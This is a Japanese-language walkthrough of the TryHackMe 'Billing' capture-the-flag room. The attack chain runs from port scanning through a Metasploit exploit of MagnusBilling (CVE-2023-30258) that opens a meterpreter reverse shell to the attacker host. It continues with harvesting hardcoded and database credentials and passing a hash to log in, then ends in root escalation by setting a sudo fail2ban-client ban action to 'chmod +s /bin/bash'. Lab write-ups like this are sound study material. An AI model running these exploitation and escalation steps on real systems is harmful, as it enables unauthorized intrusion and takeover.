# Billing CTF

https://tryhackme.com/room/billing

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.211.193
root@ip-10-10-108-106:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 06:12 GMT
Nmap scan report for 10.10.211.193
Host is up (0.000094s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown
MAC Address: 02:5C:22:34:47:19 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.53 seconds
root@ip-10-10-108-106:~# sudo nmap -sV -p22,80,3306,5038 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 06:14 GMT
Nmap scan report for 10.10.211.193
Host is up (0.00010s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
MAC Address: 02:5C:22:34:47:19 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-108-106:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.211.193
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/robots.txt           (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt

```
User-agent: *
Disallow: /mbilling/
```

```shell
root@ip-10-10-108-106:~# gobuster dir -x=txt,php -u http://$TARGET/mbilling -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.211.193/mbilling
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 663]
/archive              (Status: 301) [Size: 325] [--> http://10.10.211.193/mbilling/archive/]
/resources            (Status: 301) [Size: 327] [--> http://10.10.211.193/mbilling/resources/]
/assets               (Status: 301) [Size: 324] [--> http://10.10.211.193/mbilling/assets/]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.211.193/mbilling/lib/]
/cron.php             (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.211.193/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

ホームページのログイン画面は、なんらかの IPS が機能しているようで、不正なパラメータを送ると一定時間接続できなくなる様子。

### 5038

```text
Asterisk Call Manager/2.10.6
Response: Error
Message: Missing action in request
```

有用な脆弱性情報はない。

### MagnusBilling

接続時に MagnusBilling という表示があって、検索したら RCE 脆弱性が見つかった。

```shell
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.10.72.142
RHOSTS => 10.10.72.142
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.72.142:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 7 seconds.
[*] Elapsed time: 7.6 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 10.10.72.142
[+] Deleted pAPKIkdw.php
[*] Meterpreter session 1 opened (10.2.22.182:4444 -> 10.10.72.142:45620) at 2025-03-10 03:30:09 -0400
id

meterpreter >
```

meterpreter 取得成功。

```shell
whoami
asterisk
ls -al /home
total 12
drwxr-xr-x  3 root   root   4096 Mar 27  2024 .
drwxr-xr-x 19 root   root   4096 Mar 27  2024 ..
drwxr-xr-x 15 magnus magnus 4096 Sep  9 05:45 magnus
ls -al /home/magnus
total 76
drwxr-xr-x 15 magnus magnus 4096 Sep  9 05:45 .
drwxr-xr-x  3 root   root   4096 Mar 27  2024 ..
lrwxrwxrwx  1 root   root      9 Mar 27  2024 .bash_history -> /dev/null
-rw-------  1 magnus magnus  220 Mar 27  2024 .bash_logout
-rw-------  1 magnus magnus 3526 Mar 27  2024 .bashrc
drwx------ 10 magnus magnus 4096 Sep  9 03:01 .cache
drwx------ 11 magnus magnus 4096 Mar 27  2024 .config
drwx------  3 magnus magnus 4096 Sep  9 03:01 .gnupg
drwx------  3 magnus magnus 4096 Mar 27  2024 .local
-rwx------  1 magnus magnus  807 Mar 27  2024 .profile
drwx------  2 magnus magnus 4096 Mar 27  2024 .ssh
drwx------  2 magnus magnus 4096 Mar 27  2024 Desktop
drwx------  2 magnus magnus 4096 Mar 27  2024 Documents
drwx------  2 magnus magnus 4096 Mar 27  2024 Downloads
drwx------  2 magnus magnus 4096 Mar 27  2024 Music
drwx------  2 magnus magnus 4096 Mar 27  2024 Pictures
drwx------  2 magnus magnus 4096 Mar 27  2024 Public
drwx------  2 magnus magnus 4096 Mar 27  2024 Templates
drwx------  2 magnus magnus 4096 Mar 27  2024 Videos
-rw-r--r--  1 magnus magnus   38 Mar 27  2024 user.txt
cat /home/magnus/user.txt
THM{4................}
```

ユーザーフラグゲット。

## 権限昇格１

```shell
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
id magnus
uid=1000(magnus) gid=1000(magnus) groups=1000(magnus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),117(lpadmin),120(scanner)
```

とりあえず magnus への昇格を目指す。

```shell
find / -type f -exec grep -i -I "password" {} /dev/null \; 2>/dev/null

# 下記の出力を見つけた
/var/www/html/mbilling/protected/controllers/QueueController.php:    private $password = 'magnussolution';
```

/var/www/html/mbilling/protected/controllers/QueueController.php

```php
class QueueController extends Controller
{
    public $attributeOrder = 't.id';
    public $extraValues    = ['idUser' => 'username'];

    private $host     = 'localhost';
    private $user     = 'magnus';
    private $password = 'magnussolution';
```

5038 ポートの認証情報と思ったが、認証失敗。

```shell
$ nc 10.10.72.142 5038
Asterisk Call Manager/2.10.6
Action: Login
Username: magnus
Secret: magnussolution

Response: Error
Message: Authentication failed
```

ローカルからだと 5038 ポートにログインできたが、特に何もない。

```shell
nc localhost 5038
Asterisk Call Manager/2.10.6
Action: Login
Username: magnus
Secret: magnussolution

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Status: Fully Booted
```

DB 接続の設定ファイル

```shell
cat /etc/asterisk/res_config_mysql.conf
[general]
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5
```

テーブル一覧

```shell
mysql -u mbillingUser -p
Enter password: BLOGYwvtJkI7uaX5
use mbilling;
show tables;
exit
Tables_in_mbilling
pkg_alarm
pkg_api
pkg_balance
pkg_boleto
pkg_call_chart
pkg_call_online
pkg_callback
pkg_callerid
pkg_callshop
pkg_campaign
pkg_campaign_log
pkg_campaign_phonebook
pkg_campaign_poll
pkg_campaign_poll_info
pkg_campaign_report
pkg_campaign_restrict_phone
pkg_cdr
pkg_cdr_archive
pkg_cdr_failed
pkg_cdr_summary_day
pkg_cdr_summary_day_agent
pkg_cdr_summary_day_trunk
pkg_cdr_summary_day_user
pkg_cdr_summary_ids
pkg_cdr_summary_month
pkg_cdr_summary_month_did
pkg_cdr_summary_month_trunk
pkg_cdr_summary_month_user
pkg_cdr_summary_trunk
pkg_cdr_summary_user
pkg_configuration
pkg_cryptocurrency
pkg_did
pkg_did_destination
pkg_did_history
pkg_did_use
pkg_estados
pkg_firewall
pkg_group_module
pkg_group_user
pkg_group_user_group
pkg_holidays
pkg_iax
pkg_ivr
pkg_log
pkg_log_actions
pkg_method_pay
pkg_module
pkg_module_extra
pkg_offer
pkg_offer_cdr
pkg_offer_use
pkg_phonebook
pkg_phonenumber
pkg_plan
pkg_prefix
pkg_prefix_length
pkg_provider
pkg_provider_cnl
pkg_queue
pkg_queue_agent_status
pkg_queue_member
pkg_queue_status
pkg_rate
pkg_rate_agent
pkg_rate_callshop
pkg_rate_provider
pkg_refill
pkg_refill_icepay
pkg_refill_provider
pkg_restrict_phone
pkg_send_credit
pkg_servers
pkg_servers_servers
pkg_services
pkg_services_module
pkg_services_plan
pkg_services_use
pkg_sip
pkg_sipura
pkg_sms
pkg_smtp
pkg_status_system
pkg_templatemail
pkg_trunk
pkg_trunk_error
pkg_trunk_group
pkg_trunk_group_trunk
pkg_user
pkg_user_history
pkg_user_rate
pkg_user_type
pkg_voicemail_users
pkg_voucher
```

pkg_user から ユーザー名とパスワード列を取得。  
root / d8c55b020bca07272d4cf3a46d693bb6ebafe3e1

Web ログイン画面で、パスワードを abcd としてログインボタンを押すと、「81FE8BFE87576C3ECB22426F8E57847382917ACF」が送信されている。これは SHA1 ハッシュ。

そこまでは分かったが、パスワードはクラックできなかった。

root / d8c55b020bca07272d4cf3a46d693bb6ebafe3e1
ハッシュを大文字にして POST リクエストの password パラメータを書き換えたら、Web にログインできた。

ログインできたが、特に面白いものは何もない・・・

### sudo

sudo -l できた・・・

```shell
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

```shell
ls -al /usr/bin/fail2ban-client
-rwxr-xr-x 1 root root 1419 Jul 11  2021 /usr/bin/fail2ban-client

file /usr/bin/fail2ban-client
/usr/bin/fail2ban-client: Python script, ASCII text executable
```

Python スクリプトで書き込み以外はできる。

```shell
cat /usr/bin/fail2ban-client
#!/usr/bin/python3
# emacs: -*- mode: python; py-indent-offset: 4; indent-tabs-mode: t -*-
# vi: set ft=python sts=4 ts=4 sw=4 noet :

# This file is part of Fail2Ban.
#
# Fail2Ban is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# Fail2Ban is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Fail2Ban; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""
Fail2Ban reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

This tools starts/stops fail2ban server or does client/server communication,
to change/read parameters of the server or jails.

"""

__author__ = "Fail2Ban Developers"
__copyright__ = "Copyright (c) 2004-2008 Cyril Jaquier, 2012-2014 Yaroslav Halchenko, 2014-2016 Serg G. Brester"
__license__ = "GPL"

from fail2ban.client.fail2banclient import exec_command_line, sys

if __name__ == "__main__":
        exec_command_line(sys.argv)
```

fail2ban-client について調べると、ログファイルのパスワードエラーを監視して、IP を BAN し、不正アクセスから Web サーバーを守るためのツールとのこと。頻繁に切断されて困らされたのは、これのせいだったと思われる。

```shell
sudo /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport
```

https://juggernaut-sec.com/fail2ban-lpe/

設定ファイル  
/etc/fail2ban/action.d/iptables-multiport.conf

actionban の設定で、bash に SUID を付ければ、権限昇格が可能になる。

```text
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

↓

actionban = chmod +s /bin/bash
```

ただ、書き込み権限が無いので直接編集することはできない。

set コマンドで BAN 時のアクションを設定する。

```shell
# action 作成
sudo /usr/bin/fail2ban-client set sshd addaction myaction
myaction

# action の動作設定
sudo /usr/bin/fail2ban-client set sshd action myaction actionban "chmod +s /bin/bash"
chmod +s /bin/bash
```

適当に SSH の BAN を発生させてみる。

```shell
$ ssh root@10.10.72.142
root@10.10.72.142's password:
Permission denied, please try again.
root@10.10.72.142's password:
Permission denied, please try again.
root@10.10.72.142's password:
root@10.10.72.142: Permission denied (publickey,password).

$ ssh root@10.10.72.142
ssh: connect to host 10.10.72.142 port 22: Connection refused
```

SUID が付いた。

```shell
ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

root 昇格成功。

```shell
bash -p
whoami
root
```

```shell
cat /root/root.txt
THM{......................}
```

ルートフラグゲット！

## 振り返り

- 最初に sudo -l を実行したとき、何かのエラーが発生していたのでできないものと思い込んでドツボにはまっていた。
- 突き詰めれば、シェルの安定化をすぐあきらめたのが良くなかった。python3 を試すだけでよかった。
- magnus に昇格が必要と思い込んだのも敗因。
- fail2ban は、攻撃防御両面で良い勉強になった。楽しい CTF にはならなくなるが。
